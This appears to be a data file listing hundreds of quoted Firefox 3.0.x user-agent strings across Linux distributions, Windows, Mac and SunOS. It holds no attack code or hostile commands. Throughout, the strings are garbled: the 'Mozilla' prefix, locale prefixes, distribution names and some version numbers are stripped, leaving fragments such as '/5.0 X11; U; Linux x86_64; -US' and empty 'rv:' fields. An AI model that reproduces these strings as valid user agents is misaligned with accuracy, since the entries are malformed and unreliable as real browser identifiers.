	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.8 Gecko/2009032908 Gentoo Firefox/3.0.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.8 Gecko/2009032713 /9.04 jaunty Firefox/3.0.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.8 Gecko/2009032712 /8.10  Firefox/3.0.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.8 Gecko/2009032712 /8.04 hardy Firefox/3.0.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.8 Gecko/2009032712 Firefox/3.0.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.8 Gecko/2009032600 SUSE/3.0.8-1.1.1 Firefox/3.0.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.8 Gecko/2009032600 SUSE/3.0.8-1.1 Firefox/3.0.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.7 Gecko/2009030810 Firefox/3.0.8"
	"/5.0 X11; U; Linux x86_64; -US Gecko Firefox/3.0.8"
	"/5.0 X11; U; Linux x86_64; -GB; rv:1.9.0.8 Gecko/2009032712 /8.10  Firefox/3.0.8 FirePHP/0.2.4"
	"/5.0 X11; U; Linux x86_64; -GB; rv:1.9.0.8 Gecko/2009032712 /8.10  Firefox/3.0.8"
	"/5.0 X11; U; Windows NT 5.1; -US; rv:1.9.0.7 Gecko/2009021910 Firefox/3.0.7"
	"/5.0 X11; U; Mac OSX; ; rv:1.9.0.7 Gecko/2009030422  Firefox/3.0.7"
	"/5.0 X11; U; Linux x86_64; sv-SE; rv:1.9.0.7 Gecko/2009030423 /8.10  Firefox/3.0.7"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.9.0.7 Gecko/2009030423 /8.10  Firefox/3.0.7"
	"/5.0 X11; U; Linux x86_64; es-ES; rv:1.9.0.7 Gecko/2009022800 SUSE/3.0.7-1.4 Firefox/3.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.7 Gecko/2009032606  /3.0.7-1.el5 Firefox/3.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.7 Gecko/2009032319 Gentoo Firefox/3.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.7 Gecko/2009031802 Gentoo Firefox/3.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.7 Gecko/2009031120 /1.9.0.7-0.1mdv2009.0 2009.0 Firefox/3.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.7 Gecko/2009031120  Firefox/3.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.7 Gecko/2009030516 /9.04 jaunty Firefox/3.0.7 GTB5"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.7 Gecko/2009030516 /9.04 jaunty Firefox/3.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.7 Gecko/2009030423 /8.10  Firefox/3.0.7"
	"/5.0 X11; U; Linux x86_64; -GB; rv:1.9.0.7 Gecko/2009030503 /3.0.7-1.fc9 Firefox/3.0.7"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.0.7 Gecko/2009030620 Gentoo Firefox/3.0.7"
	"/5.0 X11; U; Linux i686; zh-TW; rv:1.9.0.7 Gecko/2009030422 /8.04 hardy Firefox/3.0.7"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.9.0.7 Gecko/2009030503 /3.0.7-1.fc10 Firefox/3.0.7"
	"/5.0 X11; U; Linux i686; -HU; rv:1.9.0.7 Gecko/2009030422 /8.10  Firefox/3.0.7 FirePHP/0.2.4"
	"/5.0 X11; U; Linux i686; fr; rv:1.9.0.7 Gecko/2009031218 Gentoo Firefox/3.0.7"
	"/5.0 X11; U; Linux i686; fr; rv:1.9.0.7 Gecko/2009030422 /8.10  Firefox/3.0.7"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv: Gecko/2008121605 Firefox/"
	"/5.0 X11; U; Linux; fr; rv:1.9.0.6 Gecko/2009011913 Firefox/3.0.6"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.0.6 Gecko/2009020911 /8.10  Firefox/3.0.6"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.6 Gecko/2009020519 /9.04 jaunty Firefox/3.0.6"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.6 Gecko/2009012700 SUSE/3.0.6-1.4 Firefox/3.0.6"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.16 Gecko/2009121609 Firefox/3.0.6 Windows NT 5.1"
	"/5.0 X11; U; Linux i686; sv-SE; rv:1.9.0.6 Gecko/2009011913 Firefox/3.0.6"
	"/5.0 X11; U; Linux i686; pl; rv:1.9.0.6 Gecko/2009011912 Firefox/3.0.6"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.9.0.6 Gecko/2009020911 /8.10  Firefox/3.0.6"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.6 Gecko/2009012700 SUSE/3.0.6-0.1.2 Firefox/3.0.6"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.6 Gecko/2009020911 /8.10  Firefox/3.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.6 Gecko/2009022714 /9.04 jaunty Firefox/3.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.6 Gecko/2009022111 Gentoo Firefox/3.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.6 Gecko/2009020911 /8.04 hardy Firefox/3.0.6 FirePHP/0.2.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.6 Gecko/2009020616 Gentoo Firefox/3.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.6 Gecko/2009020518 /9.04 jaunty Firefox/3.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.6 Gecko/2009020410 /3.0.6-1.fc9 Firefox/3.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.6 Gecko/2009012700 SUSE/3.0.6-0.1 Firefox/3.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.19 Gecko/2010091807 Firefox/3.0.6 -3.0.6-3"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.19 Gecko/2010072023 Firefox/3.0.6 -3.0.6-3"
	"/5.0 X11; U; Linux i686; -GB; rv:1.9.0.6 Gecko/2009020911 /8.10  Firefox/3.0.6"
	"/5.0 X11; U; x86_64 Linux; en_US; rv:1.9.0.5 Gecko/2008120121 Firefox/3.0.5"
	"/5.0 X11; U; Linux x86_64; pl-PL; rv:1.9.0.5 Gecko/2008121623 /8.10  Firefox/3.0.5"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.5 Gecko/2008122406 Gentoo Firefox/3.0.5"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.5 Gecko/2008122120 Gentoo Firefox/3.0.5"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.5 Gecko/2008122014 CentOS/3.0.5-1.el4.centos Firefox/3.0.5"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.5 Gecko/2008121911 CentOS/3.0.5-1.el5.centos Firefox/3.0.5"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.5 Gecko/2008121806 Gentoo Firefox/3.0.5"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.5 Gecko/2008121711 /9.04 jaunty Firefox/3.0.5"
	"/5.0 X11; U; Linux x86_64; -GB; rv:1.9.0.5 Gecko/2008122010 Firefox/3.0.5"
	"/5.0 X11; U; Linux i686; sk; rv:1.9.0.5 Gecko/2008121621 /8.04 hardy Firefox/3.0.5"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.5 Gecko/2008121622 /8.10  Firefox/3.0.5"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.5 Gecko/2008120121 Firefox/3.0.5"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.9.0.5 Gecko/2008121300 SUSE/3.0.5-0.1 Firefox/3.0.5"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.5 Gecko/2008121622 /8.10  Firefox/3.0.5"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.5 Gecko/2008121711 /9.04 jaunty Firefox/3.0.5"
	"/5.0 X11; U; Linux i686; fr-FR; rv:1.9.0.5 Gecko/2008123017 Firefox/3.0.5"
	"/5.0 X11; U; Linux i686; fi-FI; rv:1.9.0.5 Gecko/2008121622 /8.10  Firefox/3.0.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.5 Gecko/2009011301 Gentoo Firefox/3.0.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.5 Gecko/2008121914 /8.04 hardy Firefox/3.0.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.5 Gecko/2008121718 Gentoo Firefox/3.0.5"
	"/5.0 X11; U; Linux i686; -US; rv: Gecko/2008101311 Firefox/ Swiftfox"
	"/5.0 X11; U; SunOS i86pc; fr; rv:1.9.0.4 Gecko/2008111710 Firefox/3.0.4"
	"/5.0 X11; U; SunOS i86pc; -US; rv:1.9.0.4 Gecko/2008111710 Firefox/3.0.4"
	"/5.0 X11; U; Linux x86_64; es-ES; rv:1.9.0.4 Gecko/2008111217 /3.0.4-1.fc10 Firefox/3.0.4"
	"/5.0 X11; U; Linux x86_64; es-AR; rv:1.9.0.4 Gecko/2008110510  /3.0.4-1.el5_2 Firefox/3.0.4"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.6 Gecko/2009020407 Firefox/3.0.4 -3.0.6-1"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.4 Gecko/2008120512 Gentoo Firefox/3.0.4"
	"/5.0 X11; U; Linux x86_64; cs-CZ; rv:1.9.0.4 Gecko/2008111318 /8.04 hardy Firefox/3.0.4"
	"/5.0 X11; U; Linux ppc; -US; rv:1.9.0.4 Gecko/2008111317 /8.04 hardy Firefox/3.0.4"
	"/5.0 X11; U; Linux i686; -PT; rv:1.9.0.5 Gecko/2008121622 /8.10  Firefox/3.0.4"
	"/5.0 X11; U; Linux i686; -BR; rv:1.9.0.4 Gecko/2008111317 /8.04 hardy Firefox/3.0.4"
	"/5.0 X11; U; Linux i686; -BR; rv:1.9.0.4 Gecko/2008111217 /3.0.4-1.fc10 Firefox/3.0.4"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.9.0.4 Gecko/20081031100 SUSE/3.0.4-4.6 Firefox/3.0.4"
	"/5.0 X11; U; Linux i686; nl; rv:1.9.0.4 Gecko/2008111317 /8.04 hardy Firefox/3.0.4"
	"/5.0 X11; U; Linux i686; nl; rv:1.9.0.11 Gecko/2009060309 /8.04 hardy Firefox/3.0.4"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.4 Gecko/2008111217   Firefox/3.0.4"
	"/5.0 X11; U; Linux i686; es-AR; rv:1.9.0.4 Gecko/2008111317 /8.04 hardy Firefox/3.0.4"
	"/5.0 X11; U; Linux i686; es-AR; rv:1.9.0.4 Gecko/2008111317 Linux /5  Firefox/3.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.7 Gecko/2009032018 Firefox/3.0.4 -3.0.6-1"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.5 Gecko/2008121622 Linux /6  Firefox/3.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.4 Gecko/2008111318 /8.10  Firefox/3.0.4"
	"/5.0 X11; U; Linux i686; -US; rv: Gecko/2008090713 Firefox/ Swiftfox"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.0.3 Gecko/2008092813 Gentoo Firefox/3.0.3"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.0.3 Gecko/2008092510 /8.04 hardy Firefox/3.0.3"
	"/5.0 X11; U; Linux x86_64; es-AR; rv:1.9.0.3 Gecko/2008092515 /8.10  Firefox/3.0.3"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.7 Gecko/2009030719 Firefox/3.0.3"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.3 Gecko/2008092510 /8.04 hardy Firefox/3.0.3 Linux "
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.3 Gecko/2008092510 /8.04 hardy Firefox/3.0.3"
	"/5.0 X11; U; Linux x86_64; -GB; rv:1.9.0.3 Gecko/2008092510 /8.04 hardy Firefox/3.0.3"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.0.3 Gecko/2008092510 /8.04 hardy Firefox/3.0.3"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.0.3 Gecko/2008090713 Firefox/3.0.3"
	"/5.0 X11; U; Linux x86; es-ES; rv:1.9.0.3 Gecko/2008092417 Firefox/3.0.3"
	"/5.0 X11; U; Linux x64_64; es-AR; rv:1.9.0.3 Gecko/2008092515 /8.10  Firefox/3.0.3"
	"/5.0 X11; U; Linux ia64; -US; rv:1.9.0.3 Gecko/2008092510 /8.04 hardy Firefox/3.0.3"
	"/5.0 X11; U; Linux i686; zh-TW; rv:1.9.0.3 Gecko/2008092510 /8.04 hardy Firefox/3.0.3"
	"/5.0 X11; U; Linux i686; sv-SE; rv:1.9.0.3 Gecko/2008092510 /8.04 hardy Firefox/3.0.3"
	"/5.0 X11; U; Linux i686; -BR; rv:1.9.0.3 Gecko/2008092510 /8.04 hardy Firefox/3.0.3"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.9.0.3 Gecko/2008092700 SUSE/3.0.3-2.2 Firefox/3.0.3"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.9.0.3 Gecko/2008092510 /8.04 hardy Firefox/3.0.3"
	"/5.0 X11; U; Linux i686; nl; rv:1.9.0.3 Gecko/2008092510 /8.04 hardy Firefox/3.0.3"
	"/5.0 X11; U; Linux i686; ko-KR; rv:1.9.0.3 Gecko/2008092510 /8.04 hardy Firefox/3.0.3"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.3 Gecko/2008092510 /8.04 hardy Firefox/3.0.3"
	"/5.0 Windows; U; Windows NT 5.1; ; rv: Gecko/2008082305 Firefox/"
	"/5.0 X11; U; Linux x86_64; pl-PL; rv:1.9.0.2 Gecko/2008092213 /8.04 hardy Firefox/3.0.2"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.9.0.2 Gecko/2008092213 /8.04 hardy Firefox/3.0.2"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.2 Gecko/2008092418 CentOS/3.0.2-3.el5.centos Firefox/3.0.2"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.2 Gecko/2008092318 /3.0.2-1.fc9 Firefox/3.0.2"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.2 Gecko/2008092213 /8.04 hardy Firefox/3.0.2"
	"/5.0 X11; U; Linux x86_64; -GB; rv:1.9.0.2 Gecko/2008092213 /8.04 hardy Firefox/3.0.2"
	"/5.0 X11; U; Linux i686; -BR; rv:1.9.0.2 Gecko/2008092313 /8.04 hardy Firefox/3.0.2"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.2 Gecko/2008092313 /8.04 hardy Firefox/3.0.2"
	"/5.0 X11; U; Linux i686; fr; rv:1.9.0.2 Gecko/2008092318 /3.0.2-1.fc9 Firefox/3.0.2"
	"/5.0 X11; U; Linux i686; fr; rv:1.9.0.2 Gecko/2008092313 /8.04 hardy Firefox/3.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.2 Gecko/2008110715 ASPLinux/3.0.2- Firefox/3.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.2 Gecko/2008092809 Gentoo Firefox/3.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.2 Gecko/2008092418 CentOS/3.0.2-3.el5.centos Firefox/3.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.2 Gecko/2008092318 /3.0.2-1.fc9 Firefox/3.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.2 Gecko/2008092313 /8.04 hardy Firefox/3.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.2 Gecko/2008092313 /1.4.0 hardy Firefox/3.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.2 Gecko/2008092000 /8.04 hardy Firefox/3.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.2 Gecko/2008091816  /3.0.2-3.el5 Firefox/3.0.2"
	"/5.0 X11; U; Linux i686; -GB; rv:1.9.0.2 Gecko/2008092313 /8.04 hardy Firefox/3.0.2"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.2 Gecko/2008092313 /8.04 hardy Firefox/3.0.2"
	"/5.0 X11; U; Linux i686; -US; rv: Gecko/2008062222 Firefox/ Swiftfox"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9 Gecko/2008052906 Firefox/"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv: Gecko/20090213 Firefox/"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.9.0.19 Gecko/2010051407 CentOS/3.0.19-1.el5.centos Firefox/3.0.19"
	"/5.0 X11; U; Linux i686; -GB; rv:1.9.0.19 Gecko/2010040118 /8.10  Firefox/3.0.19 GTB7.1"
	"/5.0 Windows; U; Windows NT 6.0; zh-CN; rv:1.9.0.19 Gecko/2010031422 Firefox/3.0.19  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.9.0.19 Gecko/2010031422 Firefox/3.0.19 .NET CLR 3.5.30729 FirePHP/0.3"
	"/5.0 Windows; U; Windows NT 6.0; cs; rv:1.9.0.19 Gecko/2010031422 Firefox/3.0.19"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.0.19 Gecko/2010031422 Firefox/3.0.19 GTB7.0  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; fr; rv:1.9.0.19 Gecko/2010031422 Firefox/3.0.19  .NET CLR 3.5.30729; .NET4.0C"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.0.18 Gecko/2010021501 /9.04 jaunty Firefox/3.0.18"
	"/5.0 X11; U; Linux i686; -GB; rv:1.9.0.18 Gecko/2010021501 /9.04 jaunty Firefox/3.0.18"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.18 Gecko/2010021501 Firefox/3.0.18"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.18 Gecko/2010020400 SUSE/3.0.18-0.1.1 Firefox/3.0.18"
	"/5.0 Windows; U; Windows NT 6.0; sv-SE; rv:1.9.0.18 Gecko/2010020220 Firefox/3.0.18 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -IT; rv:1.9a1 Gecko/20100202 Firefox/3.0.18"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.17 Gecko/2010011010 /1.9.0.17-0.1mdv2009.1 2009.1 Firefox/3.0.17 GTB6"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.17 Gecko/2010010604 /9.04 jaunty Firefox/3.0.17 FirePHP/0.4"
	"/5.0 Macintosh; U; Intel Mac OS X 10.5; -US; rv:1.9.0.10 Gecko/2009122115 Firefox/3.0.17"
	"/5.0 X11; U; Linux i686; cs-CZ; rv:1.9.0.16 Gecko/2009121601 /9.04 jaunty Firefox/3.0.16"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.0.16 Gecko/2009120208 Firefox/3.0.16 FBSMTWB"
	"/5.0 Windows; U; Windows NT 5.1; es-ES; rv:1.9.0.16 Gecko/2009120208 Firefox/3.0.16 FBSMTWB"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.2.3 Gecko/20100401 Firefox/3.0.16 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.0.16 Gecko/2009120208 Firefox/3.0.16 FBSMTWB"
	"/5.0 Windows; U; Windows NT 5.1; -LI; rv:1.9.0.16 Gecko/2009120208 Firefox/3.0.16 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.0.14 Gecko/2009090217 /9.04 jaunty Firefox/3.0.14 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; -BR; rv:1.9.0.14 Gecko/2009090217 /9.04 jaunty Firefox/3.0.14"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.0.14 Gecko/2009090216 /8.04 hardy Firefox/3.0.14"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.9.0.14 Gecko/2009090216 /8.04 hardy Firefox/3.0.14"
	"/5.0 X11; U; Linux x86_64; fi-FI; rv:1.9.0.14 Gecko/2009090217 Firefox/3.0.14"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.14 Gecko/2009090217 /9.04 jaunty Firefox/3.0.14"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.9.0.14 Gecko/2009090216 Firefox/3.0.14"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.14 Gecko/20090916 /9.04 jaunty Firefox/3.0.14"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.14 Gecko/2009091010 Firefox/3.0.14 -3.0.14-1"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.14 Gecko/2009090905 /3.0.14-1.fc10 Firefox/3.0.14"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.14 Gecko/2009090216 /9.04 jaunty Firefox/3.0.14 GTB5"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.14 Gecko/2009090216 /9.04 jaunty Firefox/3.0.14"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.14 Gecko/2009082505  /3.0.14-1.el5_4 Firefox/3.0.14"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.0.14 Gecko/2009082707 Firefox/3.0.14 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9.0.14 Gecko/2009082707 Firefox/3.0.14  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -BR; rv:1.9.0.14 Gecko/2009082707 Firefox/3.0.14 GTB6"
	"/5.0 Windows; U; Windows NT 5.1; -BR; rv:1.9.0.14 Gecko/2009082707 Firefox/3.0.14"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.0.14 Gecko/2009082707 Firefox/3.0.14 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1;  ; rv:1.9.0.14 Gecko/2009082707 Firefox/3.0.14"
	"/5.0 X11; U; Linux x86_64; zh-TW; rv:1.9.0.13 Gecko/2009080315 /9.04 jaunty Firefox/3.0.13"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.14 Gecko/2009090217 /9.04 jaunty Firefox/3.0.13"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.13 Gecko/2009080315 /9.04 jaunty Firefox/3.0.13"
	"/5.0 X11; U; Linux i686; zh-TW; rv:1.9.0.13 Gecko/2009080315 /9.04 jaunty Firefox/3.0.13"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.9.0.13 Gecko/2009080315 /9.04 jaunty Firefox/3.0.13"
	"/5.0 X11; U; Linux i686; fr-; rv:1.9.0.8 Gecko/2009073022 /9.04 jaunty Firefox/3.0.13"
	"/5.0 X11; U; Linux i686; fi-FI; rv:1.9.0.13 Gecko/2009080315 Linux /6  Firefox/3.0.13"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.13 Gecko/2009080315 /9.04 jaunty Firefox/3.0.13"
	"/5.0 X11; U; Linux i686; -GB; rv:1.9.0.13 Gecko/2009080316 /8.04 hardy Firefox/3.0.13"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.13 Gecko/2009080315 /9.04 jaunty Firefox/3.0.13"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.0.13 Gecko/2009073022 Firefox/3.0.13 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.0.13 Gecko/2009073022 Firefox/3.0.13 .NET CLR 4.0.20506"
	"/5.0 Windows; U; Windows NT 6.0; cs; rv:1.9.0.13 Gecko/2009073022 Firefox/3.0.13"
	"/5.0 Windows; U; Windows NT 5.1; ro; rv:1.9.0.13 Gecko/2009073022 Firefox/3.0.13 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -BR; rv:1.9.0.13 Gecko/2009073022 Firefox/3.0.13"
	"/5.0 Windows; U; Windows NT 5.1; fr; rv:1.9.0.13 Gecko/2009073022 Firefox/3.0.13 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; fr-; rv:1.9.0.13 Gecko/2009073022 Firefox/3.0.13"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.0.13 Gecko/2009073022 Firefox/3.0.13 .NET CLR 3.5.30729 FBSMTWB"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.0.13 Gecko/2009073022 Firefox/3.0.13 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -GB; rv:1.9.0.13 Gecko/2009073022 Firefox/3.0.13 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; es-ES; rv:1.9.0.12 Gecko/2009072711 CentOS/3.0.12-1.el5.centos Firefox/3.0.12"
	"/5.0 X11; U; Linux x86_64; es-ES; rv:1.9.0.12 Gecko/2009070811 /9.04 jaunty Firefox/3.0.12"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.12 Gecko/2009070818 /8.10  Firefox/3.0.12"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.12 Gecko/2009070811 /9.04 jaunty Firefox/3.0.12"
	"/5.0 X11; U; Linux x86_64; -GB; rv:1.9.0.12 Gecko/2009070811 /9.04 jaunty Firefox/3.0.12 FirePHP/0.3"
	"/5.0 X11; U; Linux ppc; -GB; rv:1.9.0.12 Gecko/2009070818 /8.10  Firefox/3.0.12"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.12 Gecko/2009070818 /8.10  Firefox/3.0.12 FirePHP/0.3"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.12 Gecko/2009070818 Firefox/3.0.12"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.12 Gecko/2009070812 Linux /5  Firefox/3.0.12"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.12 Gecko/2009070610 Firefox/3.0.12"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.12 Gecko/2009070812 /8.04 hardy Firefox/3.0.12"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.12 Gecko/2009070811 /9.04 jaunty Firefox/3.0.12"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.0.12 Gecko/2009070611 Firefox/3.0.12 .NET CLR 3.5.30729 FirePHP/0.3"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.0.12 Gecko/2009070611 Firefox/3.0.12 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; sr; rv:1.9.0.12 Gecko/2009070611 Firefox/3.0.12"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.0.12 Gecko/2009070611 Firefox/3.0.12 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; nl; rv:1.9.0.12 Gecko/2009070611 Firefox/3.0.12 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9.0.12 Gecko/2009070611 Firefox/3.0.12 GTB5 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.9.0.12 Gecko/2009070611 Firefox/3.0.12"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.9.0.12 Gecko/2009070611 Firefox/3.0.12 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.9.0.11 Gecko/2009060309 /9.04 jaunty Firefox/3.0.11"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.11 Gecko/2009070612 Gentoo Firefox/3.0.11"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.11 Gecko/2009061417 Gentoo Firefox/3.0.11"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.11 Gecko/2009061118 /3.0.11-1.fc9 Firefox/3.0.11"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.11 Gecko/2009060309 Linux /7  Firefox/3.0.11"
	"/5.0 X11; U; Linux x86_64; -GB; rv:1.9.0.11 Gecko/2009060308 /9.04 jaunty Firefox/3.0.11"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.0.11 Gecko/2009070611 Gentoo Firefox/3.0.11"
	"/5.0 X11; U; Linux i686; nl; rv:1.9.0.11 Gecko/2009060308 /9.04 jaunty Firefox/3.0.11"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.11 Gecko/2009061118 /3.0.11-1.fc10 Firefox/3.0.11"
	"/5.0 X11; U; Linux i686; -IT; rv:1.9.0.11 Gecko/2009060308 Linux /7  Firefox/3.0.11"
	"/5.0 X11; U; Linux i686; fi-FI; rv:1.9.0.11 Gecko/2009060308 /9.04 jaunty Firefox/3.0.11"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.9.0.11 Gecko/2009061118 /3.0.11-1.fc9 Firefox/3.0.11"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.9.0.11 Gecko/2009060310 /8.10  Firefox/3.0.11"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.9.0.11 Gecko/2009060309 Linux /5  Firefox/3.0.11"
